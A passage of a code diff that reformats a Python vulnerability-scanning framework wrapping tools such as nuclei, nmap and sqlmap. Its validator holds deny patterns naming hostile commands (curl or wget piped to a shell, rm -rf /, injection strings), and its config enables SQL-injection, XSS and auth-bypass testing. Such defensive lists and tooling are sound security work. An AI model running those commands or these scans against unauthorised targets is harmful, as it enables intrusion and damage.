@@ -6,61 +6,75 @@
 # - Exploitation stage is intentionally a no-op placeholder. Only scan/report is implemented.
 # - External tools (subfinder, amass, naabu, httpx, nuclei) are optional; the code skips gracefully when missing.
 
-import os
-import sys
-import shlex
-import json
-import time
-import subprocess
-import platform
-import tempfile
-import shutil
-import uuid
-import threading
-import webbrowser
-import logging
 import argparse
-from pathlib import Path
-from datetime import datetime
-from typing import Dict, List, Any, Optional, Tuple
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import importlib.util
+import json
+import logging
+import os
+import platform
+import shlex
+import shutil
+import subprocess
+import sys
+import tempfile
+import threading
+import time
+import uuid
+import webbrowser
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime
+from pathlib import Path
+from typing import Any, Dict, List, Optional, Tuple
 
 # Enhanced modules integration
 try:
     from enhanced_scanning import (
-        adaptive_scan_manager, enhanced_scanner, 
-        get_current_success_rate, run_enhanced_scanning
+        adaptive_scan_manager,
+        enhanced_scanner,
+        get_current_success_rate,
+        run_enhanced_scanning,
     )
+
     ENHANCED_SCANNING_AVAILABLE = True
 except ImportError:
     ENHANCED_SCANNING_AVAILABLE = False
 
 try:
     from enhanced_tool_manager import (
-        tool_manager, enhanced_which, check_tool_availability,
-        install_missing_tools, get_tool_coverage_report
+        check_tool_availability,
+        enhanced_which,
+        get_tool_coverage_report,
+        install_missing_tools,
+        tool_manager,
     )
+
     ENHANCED_TOOL_MANAGER_AVAILABLE = True
 except ImportError:
     ENHANCED_TOOL_MANAGER_AVAILABLE = False
 
 try:
     from enhanced_validation import (
-        enhanced_validator, reliability_tracker,
-        validate_target_input, validate_targets_file,
-        get_system_reliability_score
+        enhanced_validator,
+        get_system_reliability_score,
+        reliability_tracker,
+        validate_target_input,
+        validate_targets_file,
     )
+
     ENHANCED_VALIDATION_AVAILABLE = True
 except ImportError:
     ENHANCED_VALIDATION_AVAILABLE = False
 
 try:
     from performance_monitor import (
-        performance_monitor, start_performance_monitoring,
-        stop_performance_monitoring, record_operation_result,
-        get_current_performance_metrics, is_success_rate_target_met
+        get_current_performance_metrics,
+        is_success_rate_target_met,
+        performance_monitor,
+        record_operation_result,
+        start_performance_monitoring,
+        stop_performance_monitoring,
     )
+
     PERFORMANCE_MONITOR_AVAILABLE = True
 except ImportError:
     PERFORMANCE_MONITOR_AVAILABLE = False
@@ -68,6 +82,7 @@ except ImportError:
 # BCAR Integration
 try:
     from bcar import BCARCore, PantheonBCARIntegration
+
     BCAR_AVAILABLE = True
 except ImportError:
     BCAR_AVAILABLE = False
@@ -75,7 +90,6 @@ except ImportError:
 # Rate limiting for security
 from collections import defaultdict
 from threading import Lock
-
 
 
 class RateLimiter:
@@ -94,7 +108,8 @@ class RateLimiter:
         with self.lock:
             # Clean old requests
             self.requests[identifier] = [
-                req_time for req_time in self.requests[identifier]
+                req_time
+                for req_time in self.requests[identifier]
                 if current_time - req_time < self.time_window
             ]
 
@@ -117,23 +132,25 @@ class RateLimiter:
             wait_time = self.time_window - (current_time - oldest_request)
             return max(0.0, wait_time)
 
+
 # Global rate limiter instance
 rate_limiter = RateLimiter()
 
 
+import functools
+import ipaddress
+
 # SECURITY: Input validation imports
 import re
-import ipaddress
+import time
+from typing import Any, Callable
 from urllib.parse import urlparse
 
-
-import functools
-import time
-from typing import Callable, Any
 
 # Performance monitoring decorator
 def monitor_performance(func_name: str = None):
     """Decorator to monitor function performance"""
+
     def decorator(func: Callable) -> Callable:
         @functools.wraps(func)
         def wrapper(*args, **kwargs) -> Any:
@@ -142,20 +159,30 @@ def monitor_performance(func_name: str = None):
             try:
                 result = func(*args, **kwargs)
                 execution_time = time.time() - start_time
-                
+
                 # Log performance only for slow operations
                 if execution_time > 1.0:
-                    logger.log(f"Performance: {name} took {execution_time:.2f}s", "DEBUG")
+                    logger.log(
+                        f"Performance: {name} took {execution_time:.2f}s", "DEBUG"
+                    )
                 elif execution_time > 0.1:
-                    logger.log(f"Performance: {name} took {execution_time:.3f}s", "DEBUG")
-                
+                    logger.log(
+                        f"Performance: {name} took {execution_time:.3f}s", "DEBUG"
+                    )
+
                 return result
             except Exception as e:
                 execution_time = time.time() - start_time
-                logger.log(f"Performance: {name} failed after {execution_time:.3f}s: {e}", "ERROR")
+                logger.log(
+                    f"Performance: {name} failed after {execution_time:.3f}s: {e}",
+                    "ERROR",
+                )
                 raise
+
         return wrapper
+
     return decorator
+
 
 # Enhanced input validation for security
 def validate_command_args(args: List[str]) -> bool:
@@ -165,30 +192,32 @@ def validate_command_args(args: List[str]) -> bool:
 
     # Check for dangerous command combinations across arguments
     if len(args) >= 3:
-        cmd_str = ' '.join(args[:3]).lower()
+        cmd_str = " ".join(args[:3]).lower()
         dangerous_command_combos = [
-            r'rm\s+-[rf]+\s+/',
-            r'del\s+/[sr]',
-            r'format\s+c:',
-            r'chmod\s+777\s+/',
-            r'chown\s+.*\s+/',
+            r"rm\s+-[rf]+\s+/",
+            r"del\s+/[sr]",
+            r"format\s+c:",
+            r"chmod\s+777\s+/",
+            r"chown\s+.*\s+/",
         ]
-        
+
         for pattern in dangerous_command_combos:
             if re.search(pattern, cmd_str):
-                logging.getLogger('security').warning(f"Dangerous command combination detected: {cmd_str}")
+                logging.getLogger("security").warning(
+                    f"Dangerous command combination detected: {cmd_str}"
+                )
                 return False
 
     # More precise dangerous patterns for individual arguments
     dangerous_patterns = [
-        r'[;&|`]',  # Command injection
-        r'\$\(',    # Command substitution
-        r'\.\./|\.\.\\',  # Path traversal
-        r'<script[\s>]|javascript\s*:|data\s*:',  # XSS patterns (more specific)
-        r'union\s+select|drop\s+table|delete\s+from',  # SQL injection
-        r'>\s*/dev|>\s*/proc|>\s*/sys',  # Dangerous redirections
-        r'curl\s+.*\|\s*(sh|bash|python)',  # Dangerous pipe operations
-        r'wget\s+.*\|\s*(sh|bash|python)',  # Dangerous pipe operations
+        r"[;&|`]",  # Command injection
+        r"\$\(",  # Command substitution
+        r"\.\./|\.\.\\",  # Path traversal
+        r"<script[\s>]|javascript\s*:|data\s*:",  # XSS patterns (more specific)
+        r"union\s+select|drop\s+table|delete\s+from",  # SQL injection
+        r">\s*/dev|>\s*/proc|>\s*/sys",  # Dangerous redirections
+        r"curl\s+.*\|\s*(sh|bash|python)",  # Dangerous pipe operations
+        r"wget\s+.*\|\s*(sh|bash|python)",  # Dangerous pipe operations
     ]
 
     for arg in args:
@@ -196,16 +225,23 @@ def validate_command_args(args: List[str]) -> bool:
             continue
         if len(arg) > 1000:  # Prevent buffer overflow
             return False
-        
+
         # Skip validation for common safe patterns
-        if arg.startswith('-') and len(arg) <= 20 and not arg.startswith('-rf'):  # Likely a flag, but not -rf
+        if (
+            arg.startswith("-") and len(arg) <= 20 and not arg.startswith("-rf")
+        ):  # Likely a flag, but not -rf
             continue
-        if arg.replace('.', '').replace('-', '').replace('_', '').isalnum() and len(arg) < 50:  # Safe alphanumeric
+        if (
+            arg.replace(".", "").replace("-", "").replace("_", "").isalnum()
+            and len(arg) < 50
+        ):  # Safe alphanumeric
             continue
-            
+
         for pattern in dangerous_patterns:
             if re.search(pattern, arg, re.IGNORECASE):
-                logging.getLogger('security').warning(f"Dangerous pattern detected: {pattern} in {arg[:50]}")
+                logging.getLogger("security").warning(
+                    f"Dangerous pattern detected: {pattern} in {arg[:50]}"
+                )
                 return False
 
     return True
@@ -220,37 +256,58 @@ def sanitize_filename(filename: str) -> str:
     original_filename = filename
 
     # Remove path traversal attempts (both forward and backward slashes)
-    filename = re.sub(r'\.\.[\\/]', '', filename)
-    filename = re.sub(r'\.\.', '', filename)  # Remove remaining .. sequences
-    
+    filename = re.sub(r"\.\.[\\/]", "", filename)
+    filename = re.sub(r"\.\.", "", filename)  # Remove remaining .. sequences
+
     # Remove path separators entirely
-    filename = re.sub(r'[\\/]', '_', filename)
+    filename = re.sub(r"[\\/]", "_", filename)
 
     # Remove special characters that could cause issues
-    filename = re.sub(r'[<>:"|?*\x00-\x1f]', '_', filename)
-    
+    filename = re.sub(r'[<>:"|?*\x00-\x1f]', "_", filename)
+
     # Remove control characters and extended ASCII
-    filename = re.sub(r'[\x80-\xff]', '_', filename)
+    filename = re.sub(r"[\x80-\xff]", "_", filename)
 
     # Remove leading/trailing spaces and dots
-    filename = filename.strip(' .')
+    filename = filename.strip(" .")
 
     # Limit length to filesystem safe value
     filename = filename[:255]
 
     # Ensure not empty or reserved names
     reserved_names = {
-        'CON', 'PRN', 'AUX', 'NUL', 'COM1', 'COM2', 'COM3', 'COM4', 'COM5', 
-        'COM6', 'COM7', 'COM8', 'COM9', 'LPT1', 'LPT2', 'LPT3', 'LPT4', 'LPT5', 
-        'LPT6', 'LPT7', 'LPT8', 'LPT9'
+        "CON",
+        "PRN",
+        "AUX",
+        "NUL",
+        "COM1",
+        "COM2",
+        "COM3",
+        "COM4",
+        "COM5",
+        "COM6",
+        "COM7",
+        "COM8",
+        "COM9",
+        "LPT1",
+        "LPT2",
+        "LPT3",
+        "LPT4",
+        "LPT5",
+        "LPT6",
+        "LPT7",
+        "LPT8",
+        "LPT9",
     }
-    
+
     if not filename.strip() or filename.upper() in reserved_names:
         filename = "unnamed_file"
-    
+
     # Log if significant changes were made
     if filename != original_filename:
-        logger.log(f"Filename sanitized: '{original_filename}' -> '{filename}'", "DEBUG")
+        logger.log(
+            f"Filename sanitized: '{original_filename}' -> '{filename}'", "DEBUG"
+        )
 
     return filename
 
@@ -262,17 +319,19 @@ def validate_network_address(address: str) -> bool:
 
     # Block private/localhost addresses in production
     blocked_patterns = [
-        r'^127\.',  # Localhost
-        r'^192\.168\.',  # Private
-        r'^10\.',  # Private
-        r'^172\.(1[6-9]|2[0-9]|3[01])\.',  # Private
-        r'^169\.254\.',  # Link-local
-        r'^0\.',  # Invalid
+        r"^127\.",  # Localhost
+        r"^192\.168\.",  # Private
+        r"^10\.",  # Private
+        r"^172\.(1[6-9]|2[0-9]|3[01])\.",  # Private
+        r"^169\.254\.",  # Link-local
+        r"^0\.",  # Invalid
     ]
 
     for pattern in blocked_patterns:
         if re.match(pattern, address):
-            logging.getLogger('security').warning(f"Blocked private/localhost address: {address}")
+            logging.getLogger("security").warning(
+                f"Blocked private/localhost address: {address}"
+            )
             return False
 
     return True
@@ -296,6 +355,7 @@ PLUGINS_DIR = HERE / "plugins"
 BACKUP_DIR = HERE / "backups"
 
 # ---------- Dependency Backup Functions ----------
+
 
 def backup_dependencies() -> bool:
     """Create backups of critical dependencies and configurations"""
@@ -323,25 +383,35 @@ def backup_dependencies() -> bool:
         tool_inventory = {
             "timestamp": timestamp,
             "installed_tools": {},
-            "python_packages": {}
+            "python_packages": {},
         }
 
         # Check available tools
         critical_tools = [
-            "nuclei", "subfinder", "httpx", "naabu", "sqlmap",
-            "nmap", "ffu", "gobuster", "dalfox", "subjack", "subzy"
+            "nuclei",
+            "subfinder",
+            "httpx",
+            "naabu",
+            "sqlmap",
+            "nmap",
+            "ffu",
+            "gobuster",
+            "dalfox",
+            "subjack",
+            "subzy",
         ]
 
         for tool in critical_tools:
             tool_path = which(tool)
             tool_inventory["installed_tools"][tool] = {
                 "available": bool(tool_path),
-                "path": str(tool_path) if tool_path else None
+                "path": str(tool_path) if tool_path else None,
             }
 
         # Save inventory
-        atomic_write(backup_path / "tool_inventory.json",
-                    json.dumps(tool_inventory, indent=2))
+        atomic_write(
+            backup_path / "tool_inventory.json", json.dumps(tool_inventory, indent=2)
+        )
 
         logger.log(f"Dependencies backed up to: {backup_path}", "SUCCESS")
         return True
@@ -349,6 +419,7 @@ def backup_dependencies() -> bool:
     except Exception as e:
         logger.log(f"Failed to backup dependencies: {e}", "WARNING")
         return False
+
 
 def restore_dependencies(backup_path: Path) -> bool:
     """Restore dependencies from backup"""
@@ -369,6 +440,7 @@ def restore_dependencies(backup_path: Path) -> bool:
         logger.log(f"Failed to restore dependencies: {e}", "WARNING")
         return False
 
+
 # ---------- Configuration ----------
 DEFAULT_CFG: Dict[str, Any] = {
     "repos": {
@@ -388,7 +460,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "OneListForAll": "https://github.com/six2dez/OneListForAll.git",
         "WebDiscoveryWordlists": "https://github.com/Bo0oM/fuzz.txt.git",
         "XSSPayloads": "https://github.com/payloadbox/xss-payload-list.git",
-        "SQLIPayloads": "https://github.com/payloadbox/sql-injection-payload-list.git"
+        "SQLIPayloads": "https://github.com/payloadbox/sql-injection-payload-list.git",
     },
     "limits": {
         "parallel_jobs": 20,
@@ -397,7 +469,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "max_concurrent_scans": 8,
         "http_revalidation_timeout": 8,
         "max_subdomain_depth": 3,
-        "max_crawl_time": 600
+        "max_crawl_time": 600,
     },
     "nuclei": {
         "enabled": True,
@@ -414,12 +486,12 @@ DEFAULT_CFG: Dict[str, Any] = {
             "~/nuclei-community",
             "~/nuclei-fuzzing",
             "~/custom-nuclei",
-            "~/nuclei-ksec"
+            "~/nuclei-ksec",
         ],
         "update_templates": True,
         "template_categories": "all",
         "exclude_templates": [],
-        "custom_payloads": True
+        "custom_payloads": True,
     },
     "endpoints": {
         "use_gau": True,
@@ -428,7 +500,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "use_gospider": True,
         "max_urls_per_target": 5000,
         "katana_depth": 2,
-        "gospider_depth": 3
+        "gospider_depth": 3,
     },
     "advanced_scanning": {
         "ssl_analysis": True,
@@ -445,7 +517,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "container_scanning": True,
         "shodan_integration": True,
         "threat_intelligence": True,
-        "compliance_checks": True
+        "compliance_checks": True,
     },
     "fuzzing": {
         "enable_dirb": True,
@@ -460,7 +532,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "threads": 50,
         "wordlist_sources": ["seclists", "common", "big", "directory-list", "custom"],
         "parameter_fuzzing": True,
-        "subdomain_fuzzing": True
+        "subdomain_fuzzing": True,
     },
     "xss_testing": {
         "enabled": True,
@@ -471,7 +543,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "dom_xss": True,
         "blind_xss": True,
         "payload_encoding": True,
-        "bypass_filters": True
+        "bypass_filters": True,
     },
     "subdomain_takeover": {
         "enabled": True,
@@ -480,7 +552,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "nuclei_takeover": True,
         "custom_signatures": True,
         "timeout": 30,
-        "threads": 10
+        "threads": 10,
     },
     "nmap_scanning": {
         "enabled": True,
@@ -493,23 +565,23 @@ DEFAULT_CFG: Dict[str, Any] = {
         "vulnerability_scripts": True,
         "top_ports": 1000,
         "timing": 4,
-        "custom_scripts": []
+        "custom_scripts": [],
     },
     "sqlmap_testing": {
         "enabled": True,
-        "crawl_depth": 1,                 # Reduced from 2
-        "level": 2,                       # Reduced from 3
+        "crawl_depth": 1,  # Reduced from 2
+        "level": 2,  # Reduced from 3
         "risk": 2,
         "techniques": "BEUST",
-        "threads": 2,                     # Reduced from 5
+        "threads": 2,  # Reduced from 5
         "batch_mode": True,
         "tamper_scripts": [],
         "custom_payloads": True,
         "time_based": True,
         "error_based": True,
         "union_based": True,
-        "timeout": 600,                   # Add timeout setting
-        "max_retries": 1                  # Add retry limit
+        "timeout": 600,  # Add timeout setting
+        "max_retries": 1,  # Add retry limit
     },
     "report": {
         "formats": ["html", "json", "csv", "sari"],
@@ -517,7 +589,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "include_viz": True,
         "risk_scoring": True,
         "vulnerability_correlation": True,
-        "executive_summary": True
+        "executive_summary": True,
     },
     "enhanced_reporting": {
         "enabled": True,
@@ -531,27 +603,19 @@ DEFAULT_CFG: Dict[str, Any] = {
             "availability_requirement": 8.0,
             "compliance_requirements": ["GDPR", "SOX", "HIPAA"],
             "business_hours_impact": 1.5,
-            "revenue_impact_per_hour": 25000.0
-        }
+            "revenue_impact_per_hour": 25000.0,
+        },
     },
-    "plugins": {
-        "enabled": True,
-        "directory": str(PLUGINS_DIR),
-        "auto_execute": False
-    },
-    "fallback": {
-        "enabled": True,
-        "direct_downloads": True,
-        "mirror_sites": True
-    },
+    "plugins": {"enabled": True, "directory": str(PLUGINS_DIR), "auto_execute": False},
+    "fallback": {"enabled": True, "direct_downloads": True, "mirror_sites": True},
     "resource_management": {
-        "cpu_threshold": 75,              # Reduced from 85
-        "memory_threshold": 80,           # Reduced from 90
-        "disk_threshold": 90,             # Reduced from 95
-        "monitor_interval": 3,            # Reduced for more frequent monitoring
+        "cpu_threshold": 75,  # Reduced from 85
+        "memory_threshold": 80,  # Reduced from 90
+        "disk_threshold": 90,  # Reduced from 95
+        "monitor_interval": 3,  # Reduced for more frequent monitoring
         "auto_cleanup": True,
         "cache_enabled": True,
-        "max_cache_size_mb": 1024
+        "max_cache_size_mb": 1024,
     },
     "error_handling": {
         "max_retries": 3,
@@ -559,28 +623,28 @@ DEFAULT_CFG: Dict[str, Any] = {
         "continue_on_error": True,
         "log_level": "INFO",
         "graceful_degradation": True,
-        "failover_tools": True
+        "failover_tools": True,
     },
     "validation": {
         "validate_tools_on_startup": True,
         "check_dependencies": True,
         "warn_on_missing_tools": True,
         "verify_target_reachability": True,
-        "pre_scan_validation": True
+        "pre_scan_validation": True,
     },
     "authentication": {
         "enabled": False,
         "cookies_file": "",
         "headers_file": "",
         "basic_auth": "",
-        "bearer_token": ""
+        "bearer_token": "",
     },
     "network_analysis": {
         "traceroute": True,
         "whois_lookup": True,
         "reverse_dns": True,
         "asn_lookup": True,
-        "geolocation": True
+        "geolocation": True,
     },
     "api_security": {
         "enabled": True,
@@ -590,7 +654,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "graphql_introspection": True,
         "soap_testing": True,
         "rate_limit_testing": True,
-        "authentication_bypass": True
+        "authentication_bypass": True,
     },
     "cloud_security": {
         "enabled": True,
@@ -599,7 +663,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "gcp_buckets": True,
         "cloud_metadata": True,
         "container_registries": True,
-        "kubernetes_discovery": True
+        "kubernetes_discovery": True,
     },
     "threat_intelligence": {
         "enabled": True,
@@ -609,7 +673,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "passive_total_api": "",
         "malware_detection": True,
         "reputation_checks": True,
-        "ioc_correlation": True
+        "ioc_correlation": True,
     },
     "ml_analysis": {
         "enabled": True,
@@ -617,7 +681,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "vulnerability_prioritization": True,
         "anomaly_detection": True,
         "pattern_recognition": True,
-        "risk_scoring_ml": True
+        "risk_scoring_ml": True,
     },
     "compliance": {
         "enabled": True,
@@ -626,7 +690,7 @@ DEFAULT_CFG: Dict[str, Any] = {
         "pci_dss": True,
         "gdpr_checks": True,
         "hipaa_checks": True,
-        "iso27001": True
+        "iso27001": True,
     },
     "cicd_integration": {
         "enabled": False,
@@ -635,11 +699,12 @@ DEFAULT_CFG: Dict[str, Any] = {
         "jenkins": True,
         "webhook_notifications": True,
         "api_endpoints": True,
-        "scheduled_scans": True
-    }
+        "scheduled_scans": True,
+    },
 }
 
 # ---------- Logging ----------
+
 
 class Logger:
 
@@ -653,7 +718,7 @@ class Logger:
             "INFO": 1,
             "WARNING": 2,
             "ERROR": 3,
-            "SUCCESS": 1
+            "SUCCESS": 1,
         }
 
     def set_level(self, level: str):
@@ -693,38 +758,44 @@ class Logger:
         except Exception as e:
             logging.warning(f"Operation failed: {e}")
             # Consider if this error should be handled differently
+
+
 logger = Logger()
 
 
 # Add alias for compatibility with other modules
 class PantheonLogger:
     """Compatibility wrapper for Logger class"""
+
     def __init__(self, name="PANTHEON", log_level=None):
         self._logger = Logger()
         self.name = name
         if log_level:
             self._logger.set_level(log_level)
-    
+
     def log(self, message: str, level: str = "INFO"):
         return self._logger.log(f"[{self.name}] {message}", level)
-    
+
     def info(self, message: str):
         return self.log(message, "INFO")
-    
+
     def warning(self, message: str):
         return self.log(message, "WARNING")
-    
+
     def error(self, message: str):
         return self.log(message, "ERROR")
-    
+
     def debug(self, message: str):
         return self.log(message, "DEBUG")
-    
+
     def success(self, message: str):
         return self.log(message, "SUCCESS")
 
+
 # ---------- Error Handling Helpers ----------
-def safe_execute(func, *args, default=None, error_msg="Operation failed", log_level="ERROR", **kwargs):
+def safe_execute(
+    func, *args, default=None, error_msg="Operation failed", log_level="ERROR", **kwargs
+):
     """Safely execute a function with enhanced error handling and recovery suggestions"""
     try:
         return func(*args, **kwargs)
@@ -732,29 +803,40 @@ def safe_execute(func, *args, default=None, error_msg="Operation failed", log_le
         # Provide specific guidance for file not found errors
         filepath = str(e).split("'")[1] if "'" in str(e) else "unknown"
         logger.log(f"{error_msg} - File not found: {filepath}", log_level)
-        logger.log("Recovery suggestion: Check if file exists, verify path permissions, or create missing directory", "INFO")
+        logger.log(
+            "Recovery suggestion: Check if file exists, verify path permissions, or create missing directory",
+            "INFO",
+        )
         return default
     except PermissionError as e:
         # Provide specific guidance for permission errors
         filepath = str(e).split("'")[1] if "'" in str(e) else "unknown"
         logger.log(f"{error_msg} - Permission denied: {filepath}", log_level)
-        logger.log("Recovery suggestion: Run with appropriate permissions or check file/directory ownership", "INFO")
+        logger.log(
+            "Recovery suggestion: Run with appropriate permissions or check file/directory ownership",
+            "INFO",
+        )
         return default
     except subprocess.TimeoutExpired as e:
         # Provide guidance for timeout errors with tool-specific suggestions
-        cmd = getattr(e, 'cmd', 'unknown command')
-        timeout_val = getattr(e, 'timeout', 'unknown')
+        cmd = getattr(e, "cmd", "unknown command")
+        timeout_val = getattr(e, "timeout", "unknown")
         logger.log(f"{error_msg} - Timeout after {timeout_val}s: {cmd}", log_level)
-        logger.log("Recovery suggestion: Increase timeout, reduce scan scope, or check network connectivity", "INFO")
+        logger.log(
+            "Recovery suggestion: Increase timeout, reduce scan scope, or check network connectivity",
+            "INFO",
+        )
         return default
     except subprocess.CalledProcessError as e:
         # Enhanced handling for subprocess errors
-        cmd = e.cmd if hasattr(e, 'cmd') else 'unknown'
-        returncode = e.returncode if hasattr(e, 'returncode') else 'unknown'
-        output = e.output if hasattr(e, 'output') else ''
-        stderr = e.stderr if hasattr(e, 'stderr') else ''
+        cmd = e.cmd if hasattr(e, "cmd") else "unknown"
+        returncode = e.returncode if hasattr(e, "returncode") else "unknown"
+        output = e.output if hasattr(e, "output") else ""
+        stderr = e.stderr if hasattr(e, "stderr") else ""
 
-        logger.log(f"{error_msg} - Command failed (exit code: {returncode}): {cmd}", log_level)
+        logger.log(
+            f"{error_msg} - Command failed (exit code: {returncode}): {cmd}", log_level
+        )
         if output:
             logger.log(f"Command output: {output[:500]}...", "DEBUG")
         if stderr:
@@ -764,12 +846,12 @@ def safe_execute(func, *args, default=None, error_msg="Operation failed", log_le
         if isinstance(cmd, list) and len(cmd) > 0:
             tool_name = cmd[0] if isinstance(cmd[0], str) else str(cmd[0])
             recovery_suggestions = {
-                'nuclei': 'Update nuclei templates with: nuclei -update-templates',
-                'nmap': 'Try reducing scan intensity or check target accessibility',
-                'subfinder': 'Check internet connectivity and API keys configuration',
-                'httpx': 'Verify target URLs are accessible and reduce concurrency',
-                'naabu': 'Check network permissions and reduce port range',
-                'sqlmap': 'Verify target parameter and reduce detection level'
+                "nuclei": "Update nuclei templates with: nuclei -update-templates",
+                "nmap": "Try reducing scan intensity or check target accessibility",
+                "subfinder": "Check internet connectivity and API keys configuration",
+                "httpx": "Verify target URLs are accessible and reduce concurrency",
+                "naabu": "Check network permissions and reduce port range",
+                "sqlmap": "Verify target parameter and reduce detection level",
             }
 
             for tool, suggestion in recovery_suggestions.items():
@@ -780,11 +862,17 @@ def safe_execute(func, *args, default=None, error_msg="Operation failed", log_le
         return default
     except ConnectionError as e:
         logger.log(f"{error_msg} - Network connection error: {e}", log_level)
-        logger.log("Recovery suggestion: Check internet connectivity, proxy settings, or target availability", "INFO")
+        logger.log(
+            "Recovery suggestion: Check internet connectivity, proxy settings, or target availability",
+            "INFO",
+        )
         return default
     except OSError as e:
         logger.log(f"{error_msg} - System error: {e}", log_level)
-        logger.log("Recovery suggestion: Check system resources, disk space, or file descriptors", "INFO")
+        logger.log(
+            "Recovery suggestion: Check system resources, disk space, or file descriptors",
+            "INFO",
+        )
         return default
     except Exception as e:
         # Enhanced general exception handling with more context
@@ -793,18 +881,34 @@ def safe_execute(func, *args, default=None, error_msg="Operation failed", log_le
 
         # Try to provide contextual recovery suggestions based on error content
         error_str = str(e).lower()
-        if 'connection' in error_str or 'network' in error_str:
-            logger.log("Recovery suggestion: Check network connectivity and firewall settings", "INFO")
-        elif 'memory' in error_str or 'resource' in error_str:
-            logger.log("Recovery suggestion: Free up system resources or reduce scan intensity", "INFO")
-        elif 'configuration' in error_str or 'config' in error_str:
-            logger.log("Recovery suggestion: Verify configuration file syntax and required settings", "INFO")
-        elif 'authentication' in error_str or 'auth' in error_str:
-            logger.log("Recovery suggestion: Check API keys, credentials, or authentication settings", "INFO")
+        if "connection" in error_str or "network" in error_str:
+            logger.log(
+                "Recovery suggestion: Check network connectivity and firewall settings",
+                "INFO",
+            )
+        elif "memory" in error_str or "resource" in error_str:
+            logger.log(
+                "Recovery suggestion: Free up system resources or reduce scan intensity",
+                "INFO",
+            )
+        elif "configuration" in error_str or "config" in error_str:
+            logger.log(
+                "Recovery suggestion: Verify configuration file syntax and required settings",
+                "INFO",
+            )
+        elif "authentication" in error_str or "auth" in error_str:
+            logger.log(
+                "Recovery suggestion: Check API keys, credentials, or authentication settings",
+                "INFO",
+            )
         else:
-            logger.log("Recovery suggestion: Check logs for more details, verify input parameters, or try with reduced scope", "INFO")
+            logger.log(
+                "Recovery suggestion: Check logs for more details, verify input parameters, or try with reduced scope",
+                "INFO",
+            )
 
         return default
+
 
 def safe_file_operation(operation, path, *args, **kwargs):
     """Safely perform file operations with proper error handling"""
@@ -828,41 +932,38 @@ def get_system_resources() -> Dict[str, Any]:
     """Get current system resource usage for optimization decisions"""
     try:
         import psutil
-        
+
         cpu_percent = psutil.cpu_percent(interval=0.1)
         memory = psutil.virtual_memory()
-        disk = psutil.disk_usage('/')
-        
+        disk = psutil.disk_usage("/")
+
         return {
-            'cpu_percent': cpu_percent,
-            'memory_percent': memory.percent,
-            'memory_available_gb': memory.available / (1024**3),
-            'disk_percent': disk.percent,
-            'disk_free_gb': disk.free / (1024**3)
+            "cpu_percent": cpu_percent,
+            "memory_percent": memory.percent,
+            "memory_available_gb": memory.available / (1024**3),
+            "disk_percent": disk.percent,
+            "disk_free_gb": disk.free / (1024**3),
         }
     except ImportError:
-        return {'error': 'psutil not available'}
+        return {"error": "psutil not available"}
     except Exception as e:
         logger.log(f"Failed to get system resources: {e}", "DEBUG")
-        return {'error': str(e)}
+        return {"error": str(e)}
+
 
 def optimize_concurrency_based_on_resources() -> Dict[str, int]:
     """Dynamically optimize concurrency settings based on available resources"""
     resources = get_system_resources()
-    
-    if 'error' in resources:
+
+    if "error" in resources:
         # Fallback to conservative defaults
-        return {
-            'max_concurrent_scans': 4,
-            'parallel_jobs': 5,
-            'http_timeout': 15
-        }
-    
+        return {"max_concurrent_scans": 4, "parallel_jobs": 5, "http_timeout": 15}
+
     # Adjust concurrency based on available resources
-    cpu_percent = resources.get('cpu_percent', 50)
-    memory_percent = resources.get('memory_percent', 50)
-    memory_available_gb = resources.get('memory_available_gb', 2)
-    
+    cpu_percent = resources.get("cpu_percent", 50)
+    memory_percent = resources.get("memory_percent", 50)
+    memory_available_gb = resources.get("memory_available_gb", 2)
+
     # Conservative approach: reduce concurrency if resources are constrained
     if cpu_percent > 80 or memory_percent > 80 or memory_available_gb < 1:
         concurrency_factor = 0.5
@@ -870,26 +971,30 @@ def optimize_concurrency_based_on_resources() -> Dict[str, int]:
         concurrency_factor = 0.75
     else:
         concurrency_factor = 1.0
-    
+
     # Calculate optimized values
     max_concurrent = max(1, int(8 * concurrency_factor))
     parallel_jobs = max(1, int(10 * concurrency_factor))
-    
+
     # Adjust timeout based on load
     if cpu_percent > 70:
         timeout_factor = 1.5  # Increase timeout when system is loaded
     else:
         timeout_factor = 1.0
-    
+
     optimized_settings = {
-        'max_concurrent_scans': max_concurrent,
-        'parallel_jobs': parallel_jobs,
-        'http_timeout': int(15 * timeout_factor)
+        "max_concurrent_scans": max_concurrent,
+        "parallel_jobs": parallel_jobs,
+        "http_timeout": int(15 * timeout_factor),
     }
-    
-    logger.log(f"Optimized concurrency settings: {optimized_settings} (CPU: {cpu_percent}%, Memory: {memory_percent}%)", "DEBUG")
-    
+
+    logger.log(
+        f"Optimized concurrency settings: {optimized_settings} (CPU: {cpu_percent}%, Memory: {memory_percent}%)",
+        "DEBUG",
+    )
+
     return optimized_settings
+
 
 # Enhanced command execution with resource awareness
 @monitor_performance("command_execution")
@@ -902,132 +1007,170 @@ def safe_run_command(cmd, timeout=300, **kwargs):
         default=None,
         error_msg=f"Command execution failed: {cmd}",
         log_level="ERROR",
-        **kwargs
+        **kwargs,
     )
 
-def validate_input(value: str, validators: Dict[str, Any] = None, field_name: str = "input") -> bool:
+
+def validate_input(
+    value: str, validators: Dict[str, Any] = None, field_name: str = "input"
+) -> bool:
     """Enhanced input validation with detailed security considerations and error reporting"""
     if validators is None:
         validators = {}
 
     # Check if empty input is allowed
-    if not value and not validators.get('allow_empty', False):
+    if not value and not validators.get("allow_empty", False):
         logger.log(f"Empty {field_name} not allowed", "WARNING")
         return False
 
     # Skip validation for empty values when allowed
-    if not value and validators.get('allow_empty', False):
+    if not value and validators.get("allow_empty", False):
         return True
 
     # Length validation with specific guidance
-    max_length = validators.get('max_length', 1000)
+    max_length = validators.get("max_length", 1000)
     if len(value) > max_length:
-        logger.log(f"{field_name} exceeds maximum length: {len(value)} > {max_length} characters", "WARNING")
-        logger.log(f"Consider shortening the {field_name} or using a file for longer inputs", "INFO")
+        logger.log(
